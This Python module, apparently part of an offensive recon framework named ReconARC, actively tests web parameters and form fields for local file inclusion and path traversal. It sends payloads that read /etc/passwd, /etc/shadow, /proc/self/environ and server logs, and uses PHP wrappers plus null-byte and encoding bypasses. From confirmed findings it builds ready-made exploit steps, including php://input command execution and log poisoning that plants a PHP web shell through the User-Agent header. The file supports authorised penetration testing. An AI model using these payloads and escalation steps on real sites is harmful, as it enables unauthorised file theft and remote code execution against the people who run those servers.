"""
ReconARC — Active LFI / Path Traversal Detection
=================================================
Sends actual path-traversal and Local File Inclusion (LFI) payloads to URL
parameters and form fields, then analyses the responses for indicators of
successful file inclusion.

This complements ``web_enum.check_sqli_point`` (which only *identifies*
candidate parameters) by actively confirming whether a parameter is
vulnerable to file inclusion.

Detected inclusion classes:
    traversal     - ``../../etc/passwd`` style path traversal
    lfi           - direct file read via canonical paths (``/etc/passwd``)
    wrapper       - PHP stream wrappers (``php://filter``, ``php://input``)
    null_byte     - null-byte truncation bypass (PHP < 5.3.4)
    encoding      - double/URL-encoded traversal bypass
    log_poisoning - access to log files (precursor to log poisoning RCE)
    proc          - ``/proc/self/*`` information disclosure

Safety:
    - Every request uses ``timeout=10`` via ``utils.http_get``/``http_post``
      (which swallow exceptions and return ``None``).
    - Connection errors degrade gracefully: a failed payload is recorded as
      evidence but never crashes the probe.

Usage::

    from tools.lfi_probe import (
        probe_param, probe_form, probe_url_params,
        generate_lfi_vector, detect_os,
        LFI_PAYLOADS, SUCCESS_INDICATORS,
    )
"""

import base64
import re
from typing import Dict, List, Optional
from urllib.parse import urljoin, urlparse, parse_qs

from utils import http_get, http_post
from state import AttackVector


# ── Configuration ─────────────────────────────────────────────────────

REQUEST_TIMEOUT = 10          # seconds per HTTP request
MIN_BASE64_LEN  = 100         # min length for plausible php://filter output
MAX_EVIDENCE_SNIPPET = 200    # chars of response body to keep as evidence


# ── Payloads ──────────────────────────────────────────────────────────
# Each payload is tagged with:
#   type      — inclusion class (traversal/lfi/wrapper/null_byte/encoding/
#               log_poisoning/proc/windows)
#   indicator — substring that, if present in the response, confirms success
#   os        — target OS the payload is relevant to (linux/windows/any)

LFI_PAYLOADS: List[Dict] = [
    # ── Unix path traversal ──────────────────────────────────────────
    {"payload": "../../../../etc/passwd",
     "type": "traversal", "indicator": "root:x:0:0", "os": "linux"},
    {"payload": "../../../../etc/shadow",
     "type": "traversal", "indicator": "root:", "os": "linux"},
    {"payload": "../../../../etc/hosts",
     "type": "traversal", "indicator": "localhost", "os": "linux"},

    # ── PHP wrappers ─────────────────────────────────────────────────
    {"payload": "php://filter/convert.base64-encode/resource=index.php",
     "type": "wrapper", "indicator": "__base64__", "os": "any"},
    {"payload": "php://filter/convert.base64-encode/resource=config.php",
     "type": "wrapper", "indicator": "__base64__", "os": "any"},
    {"payload": "php://input",
     "type": "wrapper", "indicator": "__phpinput__", "os": "any"},

    # ── Null byte (PHP < 5.3.4) ──────────────────────────────────────
    {"payload": "../../../../etc/passwd%00",
     "type": "null_byte", "indicator": "root:x:0:0", "os": "linux"},
    {"payload": "../../../../etc/passwd\\x00",
     "type": "null_byte", "indicator": "root:x:0:0", "os": "linux"},

    # ── Double encoding bypass ───────────────────────────────────────
    {"payload": "..%252f..%252f..%252fetc%252fpasswd",
     "type": "encoding", "indicator": "root:x:0:0", "os": "linux"},

    # ── Windows ──────────────────────────────────────────────────────
    {"payload": "..\\..\\..\\windows\\win.ini",
     "type": "windows", "indicator": "[boot loader]", "os": "windows"},
    {"payload": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
     "type": "windows", "indicator": "localhost", "os": "windows"},

    # ── Log poisoning setup ──────────────────────────────────────────
    {"payload": "../../../../var/log/apache2/access.log",
     "type": "log_poisoning", "indicator": "__any_200__", "os": "linux"},
    {"payload": "../../../../var/log/auth.log",
     "type": "log_poisoning", "indicator": "__any_200__", "os": "linux"},

    # ── /proc/ information disclosure ────────────────────────────────
    {"payload": "../../../../proc/self/environ",
     "type": "proc", "indicator": "DOCUMENT_ROOT", "os": "linux"},
    {"payload": "../../../../proc/self/cmdline",
     "type": "proc", "indicator": "__any_200__", "os": "linux"},
]


# ── Success Indicators ────────────────────────────────────────────────
# Maps a pattern (substring or regex) to a human description.  Used for
# response-body scanning after each payload is sent.

SUCCESS_INDICATORS: Dict[str, str] = {
    # Linux /etc/passwd
    "root:x:0:0":      "/etc/passwd contents (Linux)",
    "root::":          "/etc/passwd or passwd-style (Linux)",
    "bin:x:1:1":       "/etc/passwd contents (Linux)",
    "daemon:x:2:2":    "/etc/passwd contents (Linux)",
    # Linux /etc/shadow (rare — requires root)
    "root:\\$6\\$":      "/etc/shadow hash (Linux)",
    "root:\\$1\\$":      "/etc/shadow MD5 hash (Linux)",
    # Linux /etc/hosts
    "127.0.0.1\\s+localhost": "/etc/hosts contents (Linux)",
    # Windows win.ini
    "\\[boot loader\\]":  "win.ini contents (Windows)",
    "\\[extensions\\]":    "win.ini contents (Windows)",
    "\\[fonts\\]":         "win.ini contents (Windows)",
    "; for 16-bit app support": "win.ini contents (Windows)",
    # Windows system32 hosts
    "# Copyright":            "Windows hosts file",
    # /proc/self/environ
    "DOCUMENT_ROOT":          "/proc/self/environ (Linux)",
    "SERVER_ADMIN":           "/proc/self/environ (Linux)",
    "HTTP_USER_AGENT":        "/proc/self/environ (Linux)",
    "SERVER_SOFTWARE":        "/proc/self/environ (Linux)",
    # /proc/self/cmdline
    "\\x00apache":            "/proc/self/cmdline (Linux)",
    "\\x00nginx":             "/proc/self/cmdline (Linux)",
    # PHP source disclosure via wrapper (base64 blob)
    "__base64__":             "PHP filter base64 output",
    # php://input — content controlled by attacker (POST body)
    "__phpinput__":           "php://input reflection",
    # Generic — log poisoning precursor (log readable)
    "__any_200__":            "File readable (status 200 with content)",
}


# ── Helpers ───────────────────────────────────────────────────────────

def _send_request(
    url: str,
    method: str,
    param_name: str,
    payload: str,
    extra_params: Optional[Dict] = None,
    post_body: Optional[str] = None,
) -> Optional[object]:
    """Send a single request with the payload substituted into *param_name*.

    For GET, the payload goes into the ``params`` dict.  For POST, it goes
    into the ``data`` dict.  For ``php://input`` wrappers the caller may
    pass *post_body* to control the raw POST body.
    """
    extra_params = extra_params or {}
    method = method.upper()

    if method == "GET":
        params = {**extra_params, param_name: payload}
        return http_get(
            url, timeout=REQUEST_TIMEOUT, verify_ssl=False, params=params,
        )
    else:
        if post_body is not None:
            # php://input — send raw body
            return http_post(
                url, data=post_body, timeout=REQUEST_TIMEOUT,
                verify_ssl=False,
            )
        data = {**extra_params, param_name: payload}
        return http_post(
            url, data=data, timeout=REQUEST_TIMEOUT, verify_ssl=False,
        )


def _looks_like_base64(text: str) -> bool:
    """Heuristic: response is a long base64 blob (php://filter output)."""
    if len(text) < MIN_BASE64_LEN:
        return False
    stripped = text.strip()
    # Base64 alphabet + padding.  Allow surrounding whitespace/newlines.
    if not re.fullmatch(r"[A-Za-z0-9+/=\s]+", stripped):
        return False
    # Try decoding to confirm it's valid base64 of meaningful content.
    try:
        decoded = base64.b64decode(stripped, validate=True)
        if len(decoded) > 20 and decoded.isascii() or b"<?php" in decoded or b"<?" in decoded:
            return True
    except Exception:
        pass
    return False


def _check_indicator(pattern: str, body: str, status: int) -> Optional[str]:
    """Return the indicator description if *pattern* matches *body*/*status*.

    Special pseudo-patterns:
      ``__base64__``    — long base64 blob in body (php://filter)
      ``__phpinput__``  — POST body reflected (php://input)
      ``__any_200__``   — HTTP 200 with non-trivial body (generic file read)

    Returns the description string from SUCCESS_INDICATORS, or None.
    """
    if pattern == "__base64__":
        if _looks_like_base64(body):
            return SUCCESS_INDICATORS["__base64__"]
        return None
    if pattern == "__phpinput__":
        # Caller marks php://input; confirmed if body reflects a marker.
        # We rely on the POST body containing a recognisable string.
        return SUCCESS_INDICATORS["__phpinput__"] if body and status == 200 else None
    if pattern == "__any_200__":
        if status == 200 and len(body.strip()) > 20:
            return SUCCESS_INDICATORS["__any_200__"]
        return None
    # Regex match against body (case-insensitive for robustness on some patterns).
    if re.search(pattern, body, re.IGNORECASE):
        return SUCCESS_INDICATORS.get(pattern, pattern)
    return None


def _check_payload_indicator(
    indicator: str, body: str, status: int,
    baseline_body: str = "", baseline_status: int = 0,
) -> Optional[str]:
    """Check a payload's *literal* indicator against the response.

    Unlike :func:`_check_indicator` (which treats its pattern as regex for
    the global SUCCESS_INDICATORS table), payload-level ``indicator`` values
    are literal substrings (e.g. ``"root:x:0:0"``, ``"[boot loader]"``).
    They are escaped before matching so characters like ``[``/``]`` are
    treated literally, not as a regex character class.

    For the ``__any_200__`` pseudo-indicator (used by log-poisoning and
    ``/proc/self/cmdline`` payloads where exact content is unknown), a match
    requires the response to differ from the baseline — otherwise every
    normal 200 page would false-positive.
    """
    if not indicator or indicator.startswith("__"):
        if indicator == "__any_200__":
            if status != 200 or len(body.strip()) <= 20:
                return None
            # Require a meaningful difference from baseline to avoid
            # false positives when the app echoes the same page for any
            # parameter value.
            if baseline_body and body.strip() == baseline_body.strip():
                return None
            if baseline_body and abs(len(body) - len(baseline_body)) < 50:
                return None
            return SUCCESS_INDICATORS["__any_200__"]
        # Delegate other pseudo-patterns to the regex-aware checker.
        return _check_indicator(indicator, body, status)
    if re.search(re.escape(indicator), body, re.IGNORECASE):
        return SUCCESS_INDICATORS.get(indicator, indicator)
    return None


# ── (1) probe_param ───────────────────────────────────────────────────

def probe_param(
    url: str,
    method: str,
    param_name: str,
    param_value: str = "test",
    extra_params: Optional[Dict] = None,
) -> Dict:
    """Actively probe a single parameter for LFI / path traversal.

    Sends a baseline request, then each payload in ``LFI_PAYLOADS`` with the
    target parameter replaced by the payload.  Scans each response body for
    the payload's success indicator and the global ``SUCCESS_INDICATORS``.

    Args:
        url:          Target URL (path only, no query string).
        method:       ``"GET"`` or ``"POST"``.
        param_name:   Parameter name to inject into.
        param_value:  Clean baseline value (default ``"test"``).
        extra_params: Additional params sent with every request.

    Returns:
        ``{
            "is_vulnerable":   bool,
            "injection_type":  str,   # lfi | traversal | wrapper | null_byte |
                                     # encoding | windows | log_poisoning | proc | none
            "evidence":        [str, ...],
            "payloads_used":   [str, ...],
            "parameter":       str,
            "url":             str,
            "method":          str,
            "os_detected":     str,   # linux | windows | unknown
        }``
    """
    extra_params = extra_params or {}
    method = method.upper()
    result: Dict = {
        "is_vulnerable":   False,
        "injection_type":  "none",
        "evidence":        [],
        "payloads_used":   [],
        "parameter":       param_name,
        "url":             url,
        "method":          method,
        "os_detected":     "unknown",
    }

    # ── baseline request ──
    baseline = _send_request(url, method, param_name, param_value, extra_params)
    if baseline is None:
        result["evidence"].append(
            "Baseline request failed — cannot determine vulnerability"
        )
        return result

    base_status = getattr(baseline, "status_code", 0)
    base_body   = getattr(baseline, "text", "") or ""
    result["evidence"].append(
        f"Baseline: status={base_status} size={len(base_body)} "
        f"value={param_value!r}"
    )

    # Pre-scan baseline for indicators we might also see later (avoids
    # false positives where the indicator is already present).
    pre_existing: List[str] = []
    for pattern in SUCCESS_INDICATORS:
        if pattern.startswith("__"):
            continue
        if re.search(pattern, base_body, re.IGNORECASE):
            pre_existing.append(pattern)

    php_input_marker = "LFI_INPUT_MARKER_a9f3"
    confirmed_types = set()

    for entry in LFI_PAYLOADS:
        payload   = entry["payload"]
        ptype     = entry["type"]
        indicator = entry.get("indicator", "")
        p_os      = entry.get("os", "any")

        # Build the request.  php://input needs a controlled POST body.
        post_body = None
        if payload == "php://input" and method == "POST":
            post_body = php_input_marker

        resp = _send_request(
            url, method, param_name, payload, extra_params, post_body,
        )

        if resp is None:
            result["evidence"].append(
                f"Payload {payload!r} ({ptype}): request failed/timeout"
            )
            continue

        status = getattr(resp, "status_code", 0)
        body   = getattr(resp, "text", "") or ""

        # ── php://input confirmation: marker reflected in response ──
        if payload == "php://input":
            if php_input_marker in body:
                result["is_vulnerable"] = True
                confirmed_types.add("wrapper")
                result["payloads_used"].append(payload)
                result["evidence"].append(
                    f"Payload {payload!r} ({ptype}): php://input marker "
                    f"reflected — status={status} size={len(body)}"
                )
                continue
            else:
                result["evidence"].append(
                    f"Payload {payload!r} ({ptype}): no reflection "
                    f"(status={status})"
                )
                continue

        # ── Check the payload's own indicator (literal substring match) ──
        match_desc = _check_payload_indicator(
            indicator, body, status, baseline_body=base_body,
            baseline_status=base_status,
        )

        # ── Fall back to global SUCCESS_INDICATORS scan (regex) ──
        if not match_desc:
            for pattern, desc in SUCCESS_INDICATORS.items():
                if pattern.startswith("__"):
                    continue
                if pattern in pre_existing:
                    continue  # already in baseline — not payload-induced
                if re.search(pattern, body, re.IGNORECASE):
                    match_desc = desc
                    break

        if match_desc:
            result["is_vulnerable"] = True
            confirmed_types.add(ptype)
            result["payloads_used"].append(payload)
            # Snippet of the matching body region for evidence.
            snippet = body[:MAX_EVIDENCE_SNIPPET].replace("\n", " ")
            result["evidence"].append(
                f"Payload {payload!r} ({ptype}): CONFIRMED — {match_desc} "
                f"[status={status} size={len(body)}] "
                f"snippet: {snippet!r}"
            )
            # OS detection from confirmed indicator.
            det = detect_os(body)
            if det != "unknown" and result["os_detected"] == "unknown":
                result["os_detected"] = det
        else:
            result["evidence"].append(
                f"Payload {payload!r} ({ptype}): status={status} "
                f"size={len(body)} — no indicator"
            )

    # ── Pick the most severe confirmed injection type ──
    if confirmed_types:
        # Priority: lfi > traversal > wrapper > null_byte > encoding >
        # log_poisoning > proc > windows
        priority = [
            "lfi", "traversal", "wrapper", "null_byte", "encoding",
            "log_poisoning", "proc", "windows",
        ]
        for t in priority:
            if t in confirmed_types:
                result["injection_type"] = t
                break
        if result["injection_type"] == "none":
            result["injection_type"] = sorted(confirmed_types)[0]

    return result


# ── (2) probe_form ────────────────────────────────────────────────────

def probe_form(url: str, form_dict: Dict) -> List[Dict]:
    """Probe every field in an HTML form for LFI / path traversal.

    Args:
        url:       Base URL or page URL the form was found on.
        form_dict: ``{"action": str, "method": str, "fields": [str, ...]}``
                   as produced by ``web_enum.discover_forms``.

    Returns:
        List of vulnerability dicts (one per vulnerable field) in the same
        shape as :func:`probe_param`.
    """
    action = form_dict.get("action") or url
    method = (form_dict.get("method") or "GET").upper()
    fields = form_dict.get("fields") or []

    target_url = urljoin(url, action) if not action.startswith("http") else action

    vulns: List[Dict] = []
    for field in fields:
        # Inject into one field at a time; keep other fields at default values.
        extra = {f: "test" for f in fields if f != field}
        res = probe_param(
            url=target_url,
            method=method,
            param_name=field,
            param_value="test",
            extra_params=extra,
        )
        if res["is_vulnerable"]:
            vulns.append(res)
    return vulns


# ── (3) probe_url_params ──────────────────────────────────────────────

def probe_url_params(url: str) -> List[Dict]:
    """Probe every query-string parameter in *url* for LFI / traversal.

    Args:
        url: Full URL including query string, e.g.
             ``http://host/page.php?page=about``.

    Returns:
        List of vulnerability dicts for any confirmed parameter.
    """
    parsed = urlparse(url)
    if not parsed.query:
        return []

    query_params = parse_qs(parsed.query, keep_blank_values=True)
    flat_params = {k: (v[0] if v else "") for k, v in query_params.items()}
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    vulns: List[Dict] = []
    for param, value in flat_params.items():
        extra = {k: v for k, v in flat_params.items() if k != param}
        res = probe_param(
            url=base_url,
            method="GET",
            param_name=param,
            param_value=value,
            extra_params=extra,
        )
        if res["is_vulnerable"]:
            vulns.append(res)
    return vulns


# ── (4) detect_os ─────────────────────────────────────────────────────

def detect_os(evidence_text: str) -> str:
    """Determine the target OS from response evidence.

    Args:
        evidence_text: Response body text (or accumulated evidence).

    Returns:
        ``"linux"``, ``"windows"``, or ``"unknown"``.
    """
    if not evidence_text:
        return "unknown"

    text = evidence_text
    lower = text.lower()

    # Linux indicators
    linux_patterns = [
        r"root:x:0:0", r"bin:x:1:1", r"daemon:x:2:2",
        r"/home/\w+", r"/bin/\w+", r"/usr/\w+",
        r"DOCUMENT_ROOT", r"SERVER_ADMIN", r"SERVER_SOFTWARE",
        r"/proc/self/", r"localhost\s+localhost",
        r"apache2", r"nginx", r"/var/log/",
    ]
    for pat in linux_patterns:
        if re.search(pat, text, re.IGNORECASE):
            return "linux"

    # Windows indicators
    windows_patterns = [
        r"\[boot loader\]", r"\[extensions\]", r"\[fonts\]",
        r";\s*for\s+16-bit\s+app\s+support",
        r"C:\\\\Windows", r"system32", r"win\.ini",
        r"\[mci extensions\]", r"\[Network\]",
    ]
    for pat in windows_patterns:
        if re.search(pat, text, re.IGNORECASE):
            return "windows"

    return "unknown"


# ── (5) generate_lfi_vector ───────────────────────────────────────────

def generate_lfi_vector(
    url: str, param: str, info: Dict,
) -> AttackVector:
    """Build an :class:`AttackVector` from a confirmed LFI finding.

    Scoring:
        90 — /etc/passwd confirmed (classic Linux LFI)
        85 — PHP wrapper (php://filter / php://input) — often leads to RCE
        80 — log poisoning precursor (log file readable)
        75 — Windows file read (win.ini / hosts)
        70 — other traversal / encoding / null-byte / /proc

    Includes ready-to-run curl commands, PHP filter decode scripts, and
    log-poisoning escalation steps.
    """
    inj_type = info.get("injection_type", "unknown")
    evidence = info.get("evidence", [])
    payloads = info.get("payloads_used", [])
    method   = info.get("method", "GET")
    os_det   = info.get("os_detected", "unknown")
    payloads_str = payloads[0] if payloads else "../../../../etc/passwd"

    # ── Score by inclusion class ──
    score_map = {
        "lfi":           90,
        "traversal":     90,   # /etc/passwd confirmed
        "wrapper":       85,
        "log_poisoning": 80,
        "windows":       75,
        "null_byte":     70,
        "encoding":      70,
        "proc":          70,
    }
    score = score_map.get(inj_type, 70)
    # Bump to 90 only for classic Linux file-read types when /etc/passwd
    # is explicitly confirmed in the evidence.
    if inj_type in ("lfi", "traversal") and any(
        "passwd" in e.lower() for e in evidence
    ):
        score = 90
    confidence = "high" if score >= 85 else "medium"

    # ── Exploit suggestions ──
    exploit_suggestions: List[str] = []

    # curl command for the first confirmed payload
    if method.upper() == "GET":
        curl_cmd = (
            f"curl -s '{url}?{param}={payloads_str}' | head -20"
        )
    else:
        curl_cmd = (
            f"curl -s -X POST -d '{param}={payloads_str}' '{url}' | head -20"
        )
    exploit_suggestions.append(curl_cmd)

    # PHP filter base64 decode helper
    if inj_type == "wrapper" or any("filter" in p for p in payloads):
        exploit_suggestions.append(
            "# Decode php://filter base64 output:\n"
            f"curl -s '{url}?{param}=php://filter/convert.base64-encode/"
            f"resource=index.php' | base64 -d\n"
            "# Repeat for config.php, wp-config.php, ../../../etc/passwd"
        )

    # php://input → RCE (if allow_url_include=On)
    if inj_type == "wrapper":
        exploit_suggestions.append(
            "# php://input RCE (requires allow_url_include=On):\n"
            f"curl -s -X POST '{url}?{param}=php://input' "
            f"-d '<?php system(\"id\"); ?>'"
        )

    # Log poisoning escalation
    if inj_type == "log_poisoning" or any(
        "access.log" in p or "auth.log" in p for p in payloads
    ):
        exploit_suggestions.extend([
            "# Log poisoning → RCE escalation:\n"
            "1. Poison User-Agent with PHP code:\n"
            f"   curl -s -A '<?php system(\"$_GET[c]\"); ?>' '{url}'\n"
            "2. Include the log via LFI:\n"
            f"   curl -s '{url}?{param}=../../../../var/log/apache2/access.log&c=id'",
            "# Alternatively use /proc/self/environ for RCE:\n"
            f"   curl -s '{url}?{param}=../../../../proc/self/environ' "
            "(inject via User-Agent)",
        ])

    # Windows-specific
    if inj_type == "windows" or os_det == "windows":
        exploit_suggestions.append(
            "# Windows file read targets:\n"
            f"  {url}?{param}=..\\\\..\\\\..\\\\windows\\\\win.ini\n"
            f"  {url}?{param}=..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts\n"
            "# Quoted-payload variants for WAF/filter bypass:\n"
            f"  {param}=....//....//....//windows/win.ini\n"
            f"  {param}=%2e%2e%2f%2e%2e%2f%2e%2e%2fwindows%2fwin.ini"
        )

    # General LFI tooling
    exploit_suggestions.append(
        "# Automated exploitation:\n"
        f"  lfimap -u '{url}' -p '{param}'\n"
        f"  wfuzz -c -w lfi-wordlist.txt '{url}?{param}=FUZZ'\n"
        f"  python3 liffy -u '{url}' -m basic -p '{param}'"
    )

    # ── Title / description ──
    type_desc = {
        "lfi":           "Local File Inclusion (/etc/passwd confirmed)",
        "traversal":     "Path Traversal (directory traversal confirmed)",
        "wrapper":       "PHP stream wrapper abuse (php://filter / php://input)",
        "null_byte":     "Null-byte injection (PHP < 5.3.4 bypass)",
        "encoding":      "Double/URL-encoded path traversal bypass",
        "windows":       "Windows path traversal (win.ini / hosts read)",
        "log_poisoning": "Log poisoning precursor (log file readable via LFI)",
        "proc":          "/proc/self information disclosure via LFI",
    }.get(inj_type, "Local File Inclusion")

    os_note = ""
    if os_det != "unknown":
        os_note = f" Target OS detected: {os_det}."

    vector_id = f"lfi_{param}_{abs(hash(url)) % 100000}"

    return AttackVector(
        id=vector_id,
        target=url,
        category="initial_access",
        vector_type="lfi",
        title=f"LFI / Path Traversal in parameter '{param}' ({type_desc})",
        description=(
            f"Active probing confirmed {type_desc} in parameter '{param}' "
            f"at {url} ({method}). {len(payloads)} payload(s) successfully "
            f"read local files.{os_note}"
        ),
        confidence=confidence,
        score=score,
        evidence=evidence[:20],
        exploit_suggestions=exploit_suggestions,
        prerequisites=[
            "Network access to the target web application",
            "Target parameter must control a file path or include statement",
            "PHP backend (for wrapper/null-byte techniques)",
        ],
        cves=[],
        references=[
            "https://owasp.org/www-community/attacks/Path_Traversal",
            "https://owasp.org/www-community/attacks/PHP_File_Inclusion",
            "https://portswigger.net/web-security/file-path-traversal",
            "https://www.php.net/manual/en/wrappers.php",
            "https://github.com/hanslakhi/lfimap",
        ],
    )
